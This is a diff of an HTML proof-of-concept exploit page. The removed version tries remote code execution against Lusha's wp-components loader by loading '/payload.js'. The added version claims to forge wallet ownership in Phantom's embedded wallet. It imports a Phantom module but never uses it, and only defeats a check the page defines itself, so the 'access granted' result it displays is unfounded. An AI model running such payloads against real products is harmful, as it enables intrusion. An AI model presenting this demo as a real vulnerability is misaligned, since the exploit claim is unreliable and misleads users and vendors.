@@ -1,28 +1,54 @@
 <!doctype html>
 <html>
   <head>
-    <title>Lusha RCE PoC</title>
+    <title>Phantom Module Exploit PoC</title>
   </head>
   <body>
-    <h1>Testing RCE via wp-components</h1>
+    <h1>🚨 Phantom Embedded Wallet Exploit Demo</h1>
+    <pre id="output"></pre>
     <script type="module">
-      const s = document.createElement("script");
-      s.type = "module";
-      s.src = "/lusha/web-portal-components/wp-components/wp-components.esm.js"; // Full path
-      document.head.appendChild(s);
+      const output = document.getElementById("output");
 
-      s.onload = () => {
-        console.log("wp-components loaded");
+      try {
+        const mod = await import(
+          "https://embedded-wallet.phantom.app/assets/metaplexMplTokenMetadata-B1auuVGR.js"
+        );
+        const codec = mod.p();
 
-        // RCE Trigger
-        __sc_import_wp_components("/payload.js")
-          .then(() => {
-            console.log("Payload executed");
-          })
-          .catch((e) => {
-            console.error("Payload failed:", e);
-          });
-      };
+        const fakeBN = {
+          eq: () => {
+            output.innerText +=
+              "\n🔥 EQ override triggered — attacker forged ownership!";
+            return true;
+          },
+        };
+
+        const attackerPublicKey = {
+          _bn: fakeBN,
+          toBuffer: () => new Uint8Array(32),
+        };
+
+        function verifyOwnership(inputPublicKey) {
+          const legitKey = {
+            _bn: {
+              eq: () => {
+                output.innerText += "\n✅ Legit eq() check triggered.";
+                return false;
+              },
+            },
+          };
+
+          if (inputPublicKey._bn.eq(legitKey._bn)) {
+            output.innerText += "\n🎯 Access granted to attacker!";
+          } else {
+            output.innerText += "\n🚫 Access denied.";
+          }
+        }
+
+        verifyOwnership(attackerPublicKey);
+      } catch (err) {
+        output.innerText = "❌ Error loading module or running exploit: " + err;
+      }
     </script>
   </body>
 </html>
